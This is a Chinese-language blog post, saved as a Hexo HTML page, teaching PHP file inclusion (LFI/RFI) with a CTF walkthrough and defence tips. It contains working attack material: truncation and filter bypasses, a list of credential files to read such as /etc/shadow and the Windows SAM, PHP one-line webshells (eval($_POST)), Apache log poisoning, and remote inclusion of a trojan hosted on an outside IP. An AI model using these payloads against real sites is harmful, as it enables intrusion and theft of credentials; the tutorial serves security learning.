@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="John Doe" />
+
+
+
+<meta name="description" content="# 文件包含   文件包含程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件,无需再次编写,这种调用文件的过程通常称为包含。 几乎所有的脚本语言都会提供文件包含功能。文件包含漏洞在PHP Web Application中居多，在JSP&#x2F;ASP&#x2F;ASP.net程序中比较少。 PHP：include() 、include_once( )、require( )、r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http://example.com/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="lwb.Blog">
+<meta property="og:description" content="# 文件包含   文件包含程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件,无需再次编写,这种调用文件的过程通常称为包含。 几乎所有的脚本语言都会提供文件包含功能。文件包含漏洞在PHP Web Application中居多，在JSP&#x2F;ASP&#x2F;ASP.net程序中比较少。 PHP：include() 、include_once( )、require( )、r">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210413190955411.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210413185324882.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210412215338059.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210415212801379.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210415212353451.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210415212713837.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210417111111386.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210417111911429.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210417111501043.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210417104408005.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210417110257243.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210417110351823.png">
+<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210417140933923.png">
+<meta property="article:published_time" content="2021-09-15T13:27:13.000Z">
+<meta property="article:modified_time" content="2021-09-17T14:12:58.947Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20210413190955411.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="lwb.Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>文件包含 | lwb.Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/me.jpeg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/me.jpeg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-文件包含" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+      <time datetime="2021-09-15T13:27:13.000Z" itemprop="datePublished">2021-09-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件包含
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <details>
+# 文件包含
+
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210413190955411.png" alt="image-20210413190955411"></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件,无需再次编写,这种调用文件的过程通常称为包含。</p>
+<p>几乎所有的脚本语言都会提供文件包含功能。文件包含漏洞在PHP Web Application中居多，在JSP/ASP/ASP.net程序中比较少。</p>
+<p>PHP：include() 、include_once( )、require( )、require_once( )、fopen( )、readfile( )</p>
+<p>JSP/Servlet：ava.io.file( )、java.io.filereader( )</p>
+<p>ASP：include file、include virtual</p>
+<p>文件包含各个脚本代码：</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210413185324882.png" alt="image-20210413185324882"></p>
+<h3 id="文件包含漏洞成因"><a href="#文件包含漏洞成因" class="headerlink" title="文件包含漏洞成因"></a>文件包含漏洞成因</h3><p>1.web应用实现了动态包含  </p>
+<p> 在程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行<strong>动态</strong>调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。</p>
+<p>​           eg:$filename=$_GET[‘file’];</p>
+<p>​                 include($filename);</p>
+<p>2.动态包含的文件路径参数，客户端可控</p>
+<h3 id="php包含文件函数"><a href="#php包含文件函数" class="headerlink" title="php包含文件函数"></a>php包含文件函数</h3><p><strong>include()</strong></p>
+<p>当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br> 进来，发生错误时之给出一个警告，继续向下执行。</p>
+<p><strong>include_once()</strong></p>
+<p>功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
+<p>每次使用都要去查询是否记载了这个文件，效率低</p>
+<p><strong>require()</strong></p>
+<p>require()与 include()的区别在于 require()执行如果发生错误，函数会输出<br> 错误信息，并终止脚本的运行。</p>
+<p><strong>require_once()</strong></p>
+<p>功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<p>*<strong>特点</strong></p>
+<p>@ 无视文件扩展名读取文件<br>包含文件时，PHP会读取文件的源码，包括图片文件。尝试包含图片，连接为<br>[<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1/</a> fileInclude/fileinclude. php?path=smile.jpg]<br>我们发现打开图片不是图像，而是图片的源码。</p>
+<p>@ 无条件解析PHP代码</p>
+<p>文件包含在读取文件源码的同时，如果遇到符合PHP<br>语法规范的代码，就会无条件执行。例如：1.jpg   index.html …按照php解析。</p>
+<p><strong>漏扫工具：</strong></p>
+<p>Nessus</p>
+<p><strong>fimap</strong>(只能扫描文件包含漏洞)</p>
+<p>Nmap</p>
+<p>openVAS</p>
+<h3 id="本地包含LFI"><a href="#本地包含LFI" class="headerlink" title="本地包含LFI"></a>本地包含LFI</h3><p>allow_url_fopen   默认为On</p>
+<p><strong>无限制</strong></p>
+<p>$filename=$_GET[‘file’];</p>
+<p>include($filename);</p>
+<p><strong>有限制</strong></p>
+<p>$filename=$_GET[‘file’];</p>
+<p>include($filename.”.php”);</p>
+<p>方法一：%00截断</p>
+<p>条件：php版本小于5.3.4</p>
+<p>​            php.ini中的magic_quotes_gpc改为off状态(默认为on状态)                magic_quotes_gpc的作用是：转义</p>
+<p>​            重启phpstyle</p>
+<p>方法二：长度截断</p>
+<p>长度截断（windows：256，Linux：4096）</p>
+<p>./././././././././././              ……………………….</p>
+<h3 id="远程包含RLF"><a href="#远程包含RLF" class="headerlink" title="远程包含RLF"></a>远程包含RLF</h3><p>192.168.233.129/1.php?a=<a target="_blank" rel="noopener" href="http://192.168.4.76/1.txt">http://192.168.4.76/1.txt</a></p>
+<p>在php.ini中将</p>
+<p>allow_ url_ include改为0n(默认为0ff)</p>
+<p><strong>无限制</strong></p>
+<p>$filename=$_GET[‘file’];</p>
+<p>include($filename);</p>
+<p><strong>有限制</strong></p>
+<p>$filename=$_GET[‘file’];</p>
+<p>include($filename.”.php”);</p>
+<p>方法：</p>
+<p>​        %23(#)，?，绕过</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:1000/1.php?a=http://192.168.4.75/3.php%23">http://127.0.0.1:1000/1.php?a=http://192.168.4.75/3.php%23</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:1000/1.php?a=http://192.168.4.75/3.php">http://127.0.0.1:1000/1.php?a=http://192.168.4.75/3.php</a>?</p>
+<p>有时远程文件包含时，会对http://,https://进行过滤，</p>
+<p>可以双写绕过eg:htt<a target="_blank" rel="noopener" href="http://p//">http://p://</a>…….</p>
+<p><strong>注意</strong>：如果是包含远程服务器上的PHP文件，那么得到的是被远程服务器解析过的PHP，所以在写一句话木马的时候就不要做成.php的文件，一般包含.txt的文件</p>
+<h3 id="文件包含漏洞的利用方式（伪协议）"><a href="#文件包含漏洞的利用方式（伪协议）" class="headerlink" title="文件包含漏洞的利用方式（伪协议）"></a>文件包含漏洞的利用方式（伪协议）</h3><h4 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h4><p>file://                 — 访问本地文件系统<br>http://             — 访问 HTTP(s) 网址<br>ftp://          — 访问 FTP(s) URLs<br>php://               — 访问各个输入/输出流（I / O  streams）<br>zlib://                 — 压缩流<br>data://               — 数据（RFC 2397）<br>glob://                — 查找匹配的文件路径模式<br>phar://           — PHP 归档<br>ssh2://                 — Secure Shell 2<br>rar://                    — RAR<br>ogg://                  — 音频流<br>expect:/             — 处理交互式的流</p>
+<h4 id="php中常见协议的利用条件和方法"><a href="#php中常见协议的利用条件和方法" class="headerlink" title="php中常见协议的利用条件和方法"></a>php中常见协议的利用条件和方法</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210412215338059.png" alt="image-20210412215338059"></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
+<p><strong>php://input</strong><br>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<p><strong>注</strong>：当enctype=”multipart/form-data”时，php://input是无效的。(enctype是form标签的一个属性)</p>
+<p><strong>file://</strong></p>
+<p>用于访问本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。</p>
+<p><strong>http://、https://</strong></p>
+<p>URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。</p>
+<p><strong>php://filter</strong></p>
+<p>一种元封装器，设计用于数据流打开时的筛选过滤应用,可以作为一个中间流来处理其他流，可以进行任意文件的读取,常用于读取源码</p>
+<p><strong>data://</strong></p>
+<p>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+<h2 id="文件包含漏洞的利用"><a href="#文件包含漏洞的利用" class="headerlink" title="文件包含漏洞的利用"></a>文件包含漏洞的利用</h2><p>1.*<strong>读取敏感文件</strong><br> 我们可以利用文件包含漏洞读取任意文件，读取文件的时候有条件<br> @ 目标主机文件存在 ( 目标文件的路径，绝对路径，相对路径)<br> @ 具有文件可读权限</p>
+<p>Windows系统</p>
+<pre><code>c:\windows\System32\drivers\etc\hosts    //查看HOSTS文件
+c:\boot.ini             // 查看系统版本
+c:\windows\system32\inetsrv\MetaBase.xml       // IIS配置文件
+c:\windows\repair\sam    // 存储Windows系统初次安装的密码
+c:\ProgramFiles\mysql\my.ini           // MySQL配置
+c:\ProgramFiles\mysql\data\mysql\user.MYD            // MySQL root密码
+c:\windows\php.ini          // php 配置信息
+</code></pre>
+<p>Linux/Unix系统</p>
+<pre><code>/etc/passwd     // 账户信息
+/etc/shadow     // 账户密码文件
+/usr/local/app/apache2/conf/httpd.conf         // Apache2默认配置文件
+/usr/local/app/apache2/conf/extra/httpd-vhost.conf         // 虚拟网站配置
+/usr/local/app/php5/lib/php.ini     // PHP相关配置
+/etc/httpd/conf/httpd.conf         // Apache配置文件
+/etc/my.conf         // mysql 配置文件
+/var/www/html/flag.php  //php默认保存路径
+/var/www/html/index.php
+</code></pre>
+<p>2.*<strong>直接包含图片木马</strong><br> 可以利用文件包含漏洞直接包含图片木马。直接包含图片木马<br> [?path=1.png]<br> 使用蚁剑或者菜刀连接。</p>
+<p>3.*<strong>包含木马写Shell</strong><br>我们也可以将如下代码写入到图片中，<br>&lt; ?php fputs(fopen(‘shell.php’,’w’),”&lt; ?php @eval($_POST[‘cmd’])?&gt;”);?&gt;<br>该段代码的含义是，在当前目录下创建一个名为[shell.php]的文件，内容为[&lt; ?php @eval($_POST[‘cmd’]?&gt;]，当我们直接包含图片的时候，这段代码就会被执行。</p>
+<p>4.<strong>利用日志文件进行文件包含利用</strong>：</p>
+<p>某php文件存在本地文件包含漏洞，但无法上传文件，此时可以找到Apache路径，利用包含漏洞包含Apache日志文件也可以获取WebShell</p>
+<p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</p>
+<p>当访问一个不存在的资源时，Apache日志同样会记录 例如访问<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa">http://127.0.0.1/dvwa</a>…&lt; ?php phpinfo();? &gt;。Apache会记录请求“&lt; ?php phpinfo();? &gt;”，并写到access.log文件.</p>
+<p>注：php7的日志默认打开的，而php5的日志默认是关闭的。</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210415212801379.png" alt="image-20210415212801379"></p>
+<p><strong>注：</strong>PHP代码中的”&lt;,&gt;,空格”会被浏览器转码，我们可以通过burp抓包来绕过</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210415212353451.png" alt="image-20210415212353451"></p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210415212713837.png" alt="image-20210415212713837"></p>
+<p>我们也可以在UA处写上一句话木马</p>
+<h3 id="ctf题讲解"><a href="#ctf题讲解" class="headerlink" title="ctf题讲解"></a>ctf题讲解</h3><p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a></p>
+<h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210417111111386.png" alt="image-20210417111111386"></p>
+<p>白盒，代码审计</p>
+<p><strong>方法一：</strong></p>
+<p>利用Hackbar,查看目标目录</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210417111911429.png" alt="image-20210417111911429"></p>
+<p><strong>方法二：</strong>构造一句话木马?fiel=shell.txt&amp;ctfhub=eval($_POST[‘a’]);</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210417111501043.png" alt="image-20210417111501043"></p>
+<h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210417104408005.png" alt="image-20210417104408005"></p>
+<p>白盒，代码审计</p>
+<p><strong>方法一</strong></p>
+<p>与本地包含一样，有php://input伪协议</p>
+<p><strong>方法二</strong></p>
+<p>我们是内网，无法访问，随意我们需要一个公网ip（167.160.189.2），编写一句话木马&lt; ?php eval($_POST[1]);?&gt;</p>
+<p>构造url：…..?file=<a target="_blank" rel="noopener" href="http://167.160.189.2/ma.txt">http://167.160.189.2/ma.txt</a></p>
+<p>之后可以使用Hackbar工具</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210417110257243.png" alt="image-20210417110257243"></p>
+<p>也可以使用蚁剑或者菜刀连接</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210417110351823.png" alt="image-20210417110351823"></p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>1.严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；</p>
+<p>2.过滤:  ‘.’    ‘/‘   ‘\ ‘  </p>
+<p>3.包含文件验证：验证被包含的文件是否是白名单中的一员；</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210417140933923.png" alt="image-20210417140933923"></p>
+<p>4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(‘head.php’)。</p>
+<p>5.在php.ini中将allow_ url_ include和allow_url_include改为Off</p>
+<p>6.php中使用open_basedir配置限制访问在指定的区域</p>
+<p><a target="_blank" rel="noopener" href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a>               CTF-南邮大,i春秋百度杯真题</p>
+</details>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
+        <p><span>Created:</span>2021-09-15, 21:27:13</p>
+        <p><span>Updated:</span>2021-09-17, 22:12:58</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">http://example.com/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a>
+            <span class="copy-path" data-clipboard-text="From http://example.com/2021/09/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/09/15/linux/">
+                    Linux
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/09/15/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/">
+                    日常积累
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">文件包含漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">php包含文件函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%ABLFI"><span class="toc-number">4.</span> <span class="toc-text">本地包含LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%ABRLF"><span class="toc-number">5.</span> <span class="toc-text">远程包含RLF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">文件包含漏洞的利用方式（伪协议）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E6%94%AF%E6%8C%81%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.1.</span> <span class="toc-text">php支持的伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-number">6.2.</span> <span class="toc-text">php中常见协议的利用条件和方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number"></span> <span class="toc-text">文件包含漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctf%E9%A2%98%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">ctf题讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.</span> <span class="toc-text">远程包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">2.</span> <span class="toc-text">防御</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"文件包含　| lwb.Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/09/15/linux/" title="Pre: Linux">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/09/15/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/" title="Next: 日常积累">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
